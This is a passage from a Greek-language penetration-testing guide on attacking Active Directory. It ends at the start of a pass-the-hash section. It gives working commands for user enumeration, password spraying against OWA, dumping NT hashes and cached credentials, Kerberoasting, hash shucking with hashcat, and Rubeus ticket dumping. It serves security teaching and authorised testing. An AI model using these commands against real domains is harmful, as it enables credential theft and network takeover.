# Active Directory Μεθοδολογία

{{#include ../../banners/hacktricks-training.md}}

## Βασική επισκόπηση

**Active Directory** χρησιμεύει ως θεμελιώδης τεχνολογία, επιτρέποντας στους **διαχειριστές δικτύου** να δημιουργούν και να διαχειρίζονται αποτελεσματικά **τομείς**, **χρήστες** και **αντικείμενα** μέσα σε ένα δίκτυο. Έχει σχεδιαστεί για κλιμάκωση, διευκολύνοντας την οργάνωση μεγάλου αριθμού χρηστών σε διαχειρίσιμες **ομάδες** και **υποομάδες**, ενώ ελέγχει τα **δικαιώματα πρόσβασης** σε διάφορα επίπεδα.

Η δομή του **Active Directory** αποτελείται από τρία κύρια επίπεδα: **τομείς**, **δέντρα** και **δάση**. Ένας **τομέας** περιλαμβάνει μια συλλογή αντικειμένων, όπως **χρήστες** ή **συσκευές**, που μοιράζονται μια κοινή βάση δεδομένων. Τα **δέντρα** είναι ομάδες αυτών των τομέων συνδεδεμένες από μια κοινή ιεραρχία, και ένα **δάσος** αντιπροσωπεύει τη συλλογή πολλαπλών δέντρων, διασυνδεδεμένων μέσω **σχέσεων εμπιστοσύνης**, σχηματίζοντας το ανώτατο επίπεδο της οργανωτικής δομής. Σε κάθε ένα από αυτά τα επίπεδα μπορούν να οριστούν συγκεκριμένα **δικαιώματα πρόσβασης** και **επικοινωνίας**.

Βασικές έννοιες στο **Active Directory** περιλαμβάνουν:

1. **Directory** – Περιέχει όλες τις πληροφορίες που αφορούν τα αντικείμενα του Active Directory.
2. **Object** – Αναφέρεται σε οντότητες μέσα στον κατάλογο, όπως **χρήστες**, **ομάδες** ή **κοινόχρηστοι φάκελοι**.
3. **Domain** – Λειτουργεί ως δοχείο για αντικείμενα του καταλόγου, με δυνατότητα πολλαπλοί τομείς να συνυπάρχουν μέσα σε ένα **δάσος**, ο καθένας διατηρώντας τη δική του συλλογή αντικειμένων.
4. **Tree** – Ομαδοποίηση τομέων που μοιράζονται έναν κοινό root domain.
5. **Forest** – Το ανώτατο επίπεδο της οργανωτικής δομής στο Active Directory, αποτελούμενο από πολλά **δέντρα** με **σχέσεις εμπιστοσύνης** μεταξύ τους.

**Active Directory Domain Services (AD DS)** περιλαμβάνει μια σειρά υπηρεσιών κρίσιμων για την κεντρικοποιημένη διαχείριση και την επικοινωνία εντός ενός δικτύου. Αυτές οι υπηρεσίες περιλαμβάνουν:

1. **Domain Services** – Κεντροποιεί την αποθήκευση δεδομένων και διαχειρίζεται τις αλληλεπιδράσεις μεταξύ **χρηστών** και **τομέων**, συμπεριλαμβανομένων των λειτουργιών ελέγχου ταυτότητας και αναζήτησης.
2. **Certificate Services** – Εποπτεύει τη δημιουργία, διανομή και διαχείριση ασφαλών **digital certificates**.
3. **Lightweight Directory Services** – Υποστηρίζει εφαρμογές που βασίζονται σε κατάλογο μέσω του **LDAP protocol**.
4. **Directory Federation Services** – Παρέχει δυνατότητες **single-sign-on** για την πιστοποίηση χρηστών σε πολλαπλές web εφαρμογές σε μία συνεδρία.
5. **Rights Management** – Βοηθά στην προστασία υλικού με πνευματικά δικαιώματα ρυθμίζοντας τη μη εξουσιοδοτημένη διανομή και χρήση του.
6. **DNS Service** – Κρίσιμο για την επίλυση **domain names**.

For a more detailed explanation check: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Για να μάθετε πώς να **attack an AD** πρέπει να **understand** πολύ καλά τη διαδικασία **Kerberos authentication process**.\
[**Read this page if you still don't know how it works.**](kerberos-authentication.md)

## Cheat Sheet

Μπορείτε να δείτε πολλά στο [https://wadcoms.github.io/](https://wadcoms.github.io) για να έχετε μια γρήγορη εικόνα των εντολών που μπορείτε να τρέξετε για να καταγράψετε/εκμεταλλευτείτε ένα AD.

> [!WARNING]
> Kerberos communication **requires a full qualifid name (FQDN)** for performing actions. If you try to access a machine by the IP address, **it'll use NTLM and not kerberos**.

## Recon Active Directory (No creds/sessions)

Αν έχετε πρόσβαση σε ένα περιβάλλον AD αλλά δεν έχετε διαπιστευτήρια/συνόδους, μπορείτε:

- **Pentest the network:**
- Σαρώστε το δίκτυο, βρείτε μηχανήματα και ανοιχτές θύρες και προσπαθήστε να **exploit vulnerabilities** ή να **extract credentials** από αυτά (for example, [printers could be very interesting targets](ad-information-in-printers.md)).
- Η ανακάλυψη DNS μπορεί να δώσει πληροφορίες για βασικούς servers στον domain όπως web, printers, shares, vpn, media κ.λπ.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Ρίξτε μια ματιά στην Γενική [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) για περισσότερες πληροφορίες σχετικά με το πώς να το κάνετε.
- **Check for null and Guest access on smb services** (this won't work on modern Windows versions):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- A more detailed guide on how to enumerate a SMB server can be found here:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- A more detailed guide on how to enumerate LDAP can be found here (pay **special attention to the anonymous access**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Συλλέξτε διαπιστευτήρια **impersonating services with Responder** (../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Πρόσβαση σε hosts μέσω [**abusing the relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Συλλέξτε διαπιστευτήρια **exposing** [**fake UPnP services with evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Εξαγάγετε usernames/ονόματα από εσωτερικά έγγραφα, social media, υπηρεσίες (κυρίως web) μέσα στο περιβάλλον του domain αλλά και από διαθέσιμα δημόσια δεδομένα.
- Αν βρείτε τα πλήρη ονόματα των εργαζομένων, μπορείτε να δοκιμάσετε διάφορες AD **username conventions** ([**read this**](https://activedirectorypro.com/active-directory-user-naming-convention/)). Οι πιο κοινές συμβάσεις είναι: _NameSurname_, _Name.Surname_, _NamSur_ (3 γράμματα από κάθε), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _random letters and 3 random numbers_ (abc123).
- Tools:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### Ανίχνευση χρηστών

- **Anonymous SMB/LDAP enum:** Δείτε τις σελίδες [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) και [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Kerbrute enum**: Όταν ζητείται ένα **invalid username** ο server θα απαντήσει με τον **Kerberos error** κωδικό _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, επιτρέποντάς μας να προσδιορίσουμε ότι το username ήταν άκυρο. **Valid usernames** θα προκαλέσουν είτε το **TGT in a AS-REP** response είτε το σφάλμα _KRB5KDC_ERR_PREAUTH_REQUIRED_, υποδεικνύοντας ότι ο χρήστης απαιτείται να εκτελέσει pre-authentication.
- **No Authentication against MS-NRPC**: Χρήση auth-level = 1 (No authentication) απέναντι στην MS-NRPC (Netlogon) διεπαφή στους domain controllers. Η μέθοδος καλεί τη συνάρτηση `DsrGetDcNameEx2` μετά το binding της MS-NRPC διεπαφής για να ελέγξει αν ο χρήστης ή ο υπολογιστής υπάρχει χωρίς οποιαδήποτε διαπιστευτήρια. Το εργαλείο [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) υλοποιεί αυτόν τον τύπο enumeration. The research can be found [here](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

Εάν βρείτε έναν από αυτούς τους διακομιστές στο δίκτυο, μπορείτε επίσης να εκτελέσετε **user enumeration against it**. Για παράδειγμα, μπορείτε να χρησιμοποιήσετε το εργαλείο [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Μπορείτε να βρείτε λίστες usernames στο [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  και σε αυτό ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Ωστόσο, θα πρέπει να έχετε το **όνομα των ατόμων που εργάζονται στην εταιρεία** από το recon βήμα που θα έπρεπε να έχετε εκτελέσει νωρίτερα. Με το όνομα και το επώνυμο μπορείτε να χρησιμοποιήσετε το script [**namemash.py**](https://gist.github.com/superkojiman/11076951) για να δημιουργήσετε πιθανούς έγκυρους usernames.

### Γνωρίζοντας ένα ή περισσότερα usernames

Ok, οπότε γνωρίζετε ότι έχετε ήδη ένα έγκυρο username αλλά χωρίς passwords... Τότε δοκιμάστε:

- [**ASREPRoast**](asreproast.md): Αν ένας χρήστης **δεν έχει** το attribute _DONT_REQ_PREAUTH_ μπορείτε να **ζητήσετε ένα AS_REP message** για αυτόν τον χρήστη που θα περιέχει κάποια δεδομένα κρυπτογραφημένα με παράγωγο του password του χρήστη.
- [**Password Spraying**](password-spraying.md): Ας δοκιμάσουμε τα πιο **common passwords** με κάθε έναν από τους discovered users — ίσως κάποιος χρησιμοποιεί κακό password (keep in mind the password policy!).
- Σημειώστε ότι μπορείτε επίσης να **spray OWA servers** για να δοκιμάσετε να αποκτήσετε πρόσβαση στους users mail servers.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Ίσως να μπορέσετε να **αποκτήσετε** κάποια challenge **hashes** για να crackάρετε πραγματοποιώντας **poisoning** σε κάποια πρωτόκολλα του **network**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Αν καταφέρατε να κάνετε enumerate το active directory, θα έχετε **περισσότερα emails και καλύτερη κατανόηση του network**. Ίσως να καταφέρετε να εξαναγκάσετε NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) για να αποκτήσετε πρόσβαση στο AD env.

### NetExec workspace-driven recon & relay posture checks

- Χρησιμοποιήστε τα **`nxcdb` workspaces** για να κρατάτε το AD recon state ανά engagement: `workspace create <name>` δημιουργεί per-protocol SQLite DBs κάτω από `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Αλλάξτε προβολές με `proto smb|mssql|winrm` και δείτε τα gathered secrets με `creds`. Καθαρίστε χειροκίνητα ευαίσθητα δεδομένα όταν τελειώσετε: `rm -rf ~/.nxc/workspaces/<name>`.
- Γρήγορη ανακάλυψη subnet με **`netexec smb <cidr>`** αποκαλύπτει **domain**, **OS build**, **SMB signing requirements**, και **Null Auth**. Hosts που εμφανίζουν `(signing:False)` είναι **relay-prone**, ενώ οι DCs συχνά απαιτούν signing.
- Generate **hostnames in /etc/hosts** straight from NetExec output to ease targeting:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- Όταν το **SMB relay to the DC is blocked** από signing, εξακολουθήστε να ελέγχετε την κατάσταση **LDAP**: `netexec ldap <dc>` εμφανίζει `(signing:None)` / weak channel binding. Ένας DC με απαιτούμενο SMB signing αλλά απενεργοποιημένο LDAP signing παραμένει ένας εφικτός στόχος **relay-to-LDAP** για καταχρήσεις όπως **SPN-less RBCD**.

### Client-side printer credential leaks → μαζική επικύρωση διαπιστευτηρίων domain

- Οι web UIs των εκτυπωτών μερικές φορές **ενσωματώνουν κρυμμένους κωδικούς admin στο HTML**. Η προβολή source/devtools μπορεί να αποκαλύψει απλό κείμενο (π.χ., `<input value="<password>">`), επιτρέποντας πρόσβαση Basic-auth σε αποθετήρια σάρωσης/εκτύπωσης.
- Τα ανακτημένα print jobs μπορεί να περιέχουν **έγγραφα onboarding σε απλό κείμενο** με κωδικούς ανά χρήστη. Κρατήστε τις αντιστοιχίσεις ευθυγραμμισμένες κατά τη δοκιμή:
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Κλοπή NTLM διαπιστευτηρίων

Εάν μπορείτε να **πρόσβαση σε άλλους υπολογιστές ή shares** με τον **null ή guest χρήστη** μπορείτε να **τοποθετήσετε αρχεία** (όπως ένα SCF αρχείο) τα οποία αν με κάποιο τρόπο προσπελαστούν θα ενεργοποιήσουν μια **NTLM authentication προς εσάς** ώστε να μπορείτε να **κλέψετε** το **NTLM challenge** για να το σπάσετε:

{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

Το **Hash shucking** αντιμετωπίζει κάθε NT hash που ήδη έχετε ως υποψήφιο password για άλλα, πιο αργά formats των οποίων το key material προέρχεται απευθείας από το NT hash. Αντί να κάνετε brute-force μακρών passphrases σε Kerberos RC4 tickets, NetNTLM challenges, ή cached credentials, τροφοδοτείτε τα NT hashes στο Hashcat σε NT-candidate modos και αφήνετε το εργαλείο να επαληθεύσει reuse χωρίς ποτέ να μάθει το plaintext. Αυτό είναι ιδιαίτερα ισχυρό μετά από compromise ενός domain όπου μπορείτε να συλλέξετε χιλιάδες τρέχοντα και ιστορικά NT hashes.

Χρησιμοποιήστε shucking όταν:

- Έχετε ένα NT corpus από DCSync, SAM/SECURITY dumps, ή credential vaults και χρειάζεται να δοκιμάσετε reuse σε άλλα domains/forests.
- Συλλέγετε RC4-based Kerberos material (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM responses, ή DCC/DCC2 blobs.
- Θέλετε να αποδείξετε γρήγορα reuse για μακριά, μη-σπασίμα passphrases και να pivot-άρετε άμεσα μέσω Pass-the-Hash.

Η τεχνική **δεν δουλεύει** απέναντι σε encryption types των οποίων τα keys δεν είναι το NT hash (π.χ. Kerberos etype 17/18 AES). Εάν ένα domain επιβάλλει AES-only, πρέπει να επιστρέψετε στις κανονικές password modes.

#### Building an NT hash corpus

- **DCSync/NTDS** – Χρησιμοποιήστε `secretsdump.py` με history για να αρπάξετε το μεγαλύτερο δυνατό σύνολο NT hashes (και τις προηγούμενες τιμές τους):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

Οι history εγγραφές διευρύνουν δραματικά το pool υποψηφίων γιατί η Microsoft μπορεί να αποθηκεύσει έως 24 προηγούμενα hashes ανά λογαριασμό. Για περισσότερους τρόπους να συγκομίσετε NTDS secrets δείτε:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (ή Mimikatz `lsadump::sam /patch`) εξάγει τοπικά SAM/SECURITY δεδομένα και cached domain logons (DCC/DCC2). Αφαιρέστε διπλότυπα και προσθέστε αυτά τα hashes στο ίδιο `nt_candidates.txt` αρχείο.
- **Track metadata** – Κρατήστε το username/domain που παρήγαγε κάθε hash (ακόμα κι αν η wordlist περιέχει μόνο hex). Τα matched hashes σας λένε άμεσα ποιος principal επαναχρησιμοποιεί password μόλις το Hashcat εμφανίσει τον νικητή.
- Προτιμήστε candidates από το ίδιο forest ή από trusted forest· αυτό μεγιστοποιεί την πιθανότητα overlap κατά το shucking.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Σημειώσεις:

- Τα NT-candidate inputs **πρέπει να παραμείνουν raw 32-hex NT hashes**. Απενεργοποιήστε rule engines (όχι `-r`, όχι hybrid modes) γιατί το mangling καταστρέφει το candidate key material.
- Αυτές οι modes δεν είναι εγγενώς ταχύτερες, αλλά το NTLM keyspace (~30,000 MH/s σε ένα M3 Max) είναι ~100× γρηγορότερο από Kerberos RC4 (~300 MH/s). Το να δοκιμάσετε μια επιμελημένη NT λίστα κοστίζει πολύ λιγότερο από το να εξερευνήσετε ολόκληρο το password space στο αργό format.
- Τρέχετε πάντα την **τελευταία Hashcat build** (`git clone https://github.com/hashcat/hashcat && make install`) γιατί οι modes 31500/31600/35300/35400 κυκλοφόρησαν πρόσφατα.
- Αυτήν την στιγμή δεν υπάρχει NT mode για AS-REQ Pre-Auth, και τα AES etypes (19600/19700) απαιτούν το plaintext password επειδή τα keys τους παράγονται μέσω PBKDF2 από UTF-16LE passwords, όχι από raw NT hashes.

#### Example – Kerberoast RC4 (mode 35300)

1. Capture ένα RC4 TGS για ένα target SPN με έναν low-privileged user (δείτε τη σελίδα Kerberoast για λεπτομέρειες):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Shuck το ticket με τη λίστα NT σας:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Το Hashcat παράγει το RC4 key από κάθε NT candidate και επαληθεύει το `$krb5tgs$23$...` blob. Ένα match επιβεβαιώνει ότι ο service account χρησιμοποιεί ένα από τα υπάρχοντα NT hashes σας.

3. Pivot-άρετε άμεσα μέσω PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

Μπορείτε προαιρετικά να ανακτήσετε το plaintext αργότερα με `hashcat -m 1000 <matched_hash> wordlists/` αν χρειάζεται.

#### Example – Cached credentials (mode 31600)

1. Dump τα cached logons από έναν compromised workstation:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Αντιγράψτε τη DCC2 γραμμή για τον ενδιαφέρον domain user στο `dcc2_highpriv.txt` και shuck-άρετέ την:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. Ένα επιτυχημένο match επιστρέφει το NT hash που ήδη είναι γνωστό στη λίστα σας, αποδεικνύοντας ότι ο cached user επαναχρησιμοποιεί password. Χρησιμοποιήστε το απευθείας για PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) ή brute-force σε γρήγορο NTLM mode για να ανακτήσετε το string.

Η ίδια ακριβώς ροή εργασίας εφαρμόζεται σε NetNTLM challenge-responses (`-m 27000/27100`) και DCC (`-m 31500`). Μόλις εντοπιστεί ένα match μπορείτε να ξεκινήσετε relay, SMB/WMI/WinRM PtH, ή να επανασπάσετε το NT hash offline με masks/rules.

## Εξακρίβωση του Active Directory ΜΕ credentials/session

Για αυτήν τη φάση χρειάζεται να έχετε **συμβιβαστεί τα credentials ή μια session** ενός έγκυρου domain λογαριασμού. Εάν έχετε κάποια έγκυρα credentials ή ένα shell ως domain user, **θυμηθείτε ότι οι επιλογές που αναφέρθηκαν πιο πριν παραμένουν επιλογές για να συμβιβάσετε άλλους χρήστες**.

Πριν ξεκινήσετε την authenticated enumeration θα πρέπει να γνωρίζετε το **Kerberos double hop problem.**

{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Το να έχετε συμβιβαστεί έναν account είναι ένα **μεγάλο βήμα για να ξεκινήσετε τον συμβιβασμό ολόκληρου του domain**, επειδή θα μπορείτε να ξεκινήσετε την **Active Directory Enumeration:**

Σχετικά με [**ASREPRoast**](asreproast.md) τώρα μπορείτε να βρείτε κάθε πιθανό vulnerable user, και σχετικά με [**Password Spraying**](password-spraying.md) μπορείτε να πάρετε μια **λίστα όλων των usernames** και να δοκιμάσετε το password του συμβιβασμένου account, κενά passwords και νέα υποσχόμενα passwords.

- Μπορείτε να χρησιμοποιήσετε το [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- Μπορείτε επίσης να χρησιμοποιήσετε [**powershell for recon**](../basic-powershell-for-pentesters/index.html) το οποίο θα είναι πιο stealthy
- Μπορείτε επίσης να [**use powerview**](../basic-powershell-for-pentesters/powerview.md) για να εξάγετε πιο λεπτομερείς πληροφορίες
- Ενα άλλο εξαιρετικό εργαλείο για recon σε Active Directory είναι το [**BloodHound**](bloodhound.md). Δεν είναι **πολύ stealthy** (ανάλογα με τις μεθόδους συλλογής που χρησιμοποιείτε), αλλά **αν δεν σας νοιάζει** γι' αυτό, αξίζει σίγουρα να το δοκιμάσετε. Βρείτε πού οι χρήστες μπορούν να κάνουν RDP, βρείτε μονοπάτια προς άλλες ομάδες, κ.λπ.
- **Άλλα αυτοματοποιημένα εργαλεία AD enumeration είναι:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md) καθώς μπορεί να περιέχουν ενδιαφέρουσες πληροφορίες.
- Ένα **εργαλείο με GUI** που μπορείτε να χρησιμοποιήσετε για να enumer-άρετε τον κατάλογο είναι το **AdExplorer.exe** από το **SysInternal** Suite.
- Μπορείτε επίσης να αναζητήσετε στη βάση LDAP με **ldapsearch** για credentials σε πεδία _userPassword_ & _unixUserPassword_, ή ακόμη και στο _Description_. βλ. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) για άλλες μεθόδους.
- Αν χρησιμοποιείτε **Linux**, μπορείτε επίσης να enumer-άρετε το domain χρησιμοποιώντας [**pywerview**](https://github.com/the-useless-one/pywerview).
- Μπορείτε επίσης να δοκιμάσετε αυτοματοποιημένα εργαλεία όπως:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)

- **Εξαγωγή όλων των domain χρηστών**

Είναι πολύ εύκολο να πάρετε όλα τα domain usernames από τα Windows (`net user /domain` ,`Get-DomainUser` ή `wmic useraccount get name,sid`). Σε Linux, μπορείτε να χρησιμοποιήσετε: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` ή `enum4linux -a -u "user" -p "password" <DC IP>`

> Ακόμα κι αν αυτή η ενότητα Enumeration φαίνεται μικρή, αυτό είναι το πιο σημαντικό μέρος από όλα. Επισκεφθείτε τα links (κυρίως αυτά του cmd, powershell, powerview και BloodHound), μάθετε πώς να enumer-άρετε ένα domain και εξασκηθείτε μέχρι να νιώσετε άνετα. Κατά την εκτίμηση ασφάλειας, αυτή θα είναι η κρίσιμη στιγμή για να βρείτε τον δρόμο σας προς DA ή να αποφασίσετε ότι δεν μπορεί να γίνει τίποτα.

### Kerberoast

Το Kerberoasting περιλαμβάνει την απόκτηση **TGS tickets** που χρησιμοποιούνται από services συνδεδεμένα με user accounts και το σπάσιμο της κρυπτογράφησής τους — η οποία βασίζεται σε user passwords — **offline**.

Περισσότερα γι' αυτό εδώ:

{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

Μόλις έχετε αποκτήσει κάποια credentials μπορείτε να ελέγξετε αν έχετε πρόσβαση σε οποιαδήποτε **μηχανή**. Για αυτό το σκοπό, μπορείτε να χρησιμοποιήσετε το **CrackMapExec** για να δοκιμάσετε συνδέσεις σε πολλούς servers με διαφορετικά πρωτόκολλα, ανάλογα με τα port scans σας.

### Local Privilege Escalation

Εάν έχετε συμβιβαστεί credentials ή μια session ως κανονικός domain user και έχετε **πρόσβαση** με αυτόν τον χρήστη σε **οποιονδήποτε υπολογιστή του domain** θα πρέπει να προσπαθήσετε να βρείτε τρόπο να **κλιμακώσετε τοπικά τα προνόμια και να λεηλατήσετε για credentials**. Αυτό συμβαίνει γιατί μόνο με τοπικά administrator προνόμια θα μπορείτε να **dumpάρετε hashes άλλων χρηστών** στη μνήμη (LSASS) και τοπικά (SAM).

Υπάρχει μια ολοκληρωμένη σελίδα σε αυτό το βιβλίο για [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) και ένα [**checklist**](../checklist-windows-privilege-escalation.md). Επίσης, μην ξεχάσετε να χρησιμοποιήσετε το [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Current Session Tickets

Είναι πολύ **απίθανο** να βρείτε **εισιτήρια** στον τρέχοντα χρήστη που σας δίνουν άδεια να έχετε πρόσβαση σε απροσδόκητους πόρους, αλλά μπορείτε να ελέγξετε:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Εάν καταφέρατε να ανιχνεύσετε το Active Directory θα έχετε **περισσότερα emails και καλύτερη κατανόηση του δικτύου**. Μπορεί να μπορέσετε να αναγκάσετε NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### Αναζήτηση Creds σε Computer Shares | SMB Shares

Τώρα που έχετε μερικά βασικά credentials, θα πρέπει να ελέγξετε αν μπορείτε να **βρείτε** κάποια **ενδιαφέροντα αρχεία που κοινοποιούνται εντός του AD**. Μπορείτε να το κάνετε χειροκίνητα αλλά είναι πολύ βαρετή, επαναλαμβανόμενη εργασία (και περισσότερο αν βρείτε εκατοντάδες docs που πρέπει να ελέγξετε).

[**Follow this link to learn about tools you could use.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Κλέψτε NTLM Creds

Αν μπορείτε να έχετε πρόσβαση σε άλλους PCs ή shares, μπορείτε να τοποθετήσετε αρχεία (όπως ένα SCF file) που, αν με κάποιον τρόπο προσπελαστούν, θα **προκαλέσουν μια NTLM authentication εναντίον σας** ώστε να μπορείτε να **κλέψετε** την **NTLM challenge** για να την crackάρετε:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Αυτή η ευπάθεια επέτρεπε σε οποιονδήποτε authenticated χρήστη να **παραβιάσει τον domain controller**.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**Για τις παρακάτω τεχνικές ένας απλός domain user δεν αρκεί, χρειάζεστε κάποια ειδικά privileges/credentials για να εκτελέσετε αυτές τις επιθέσεις.**

### Hash extraction

Ελπίζουμε ότι έχετε καταφέρει να **compromise some local admin** account χρησιμοποιώντας [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) including relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html).  
Στη συνέχεια, ήρθε η ώρα να dump all the hashes in memory and locally.  
[**Read this page about different ways to obtain the hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Μόλις έχετε το hash ενός χρήστη**, μπορείτε να το χρησιμοποιήσετε για να τον impersonate.  
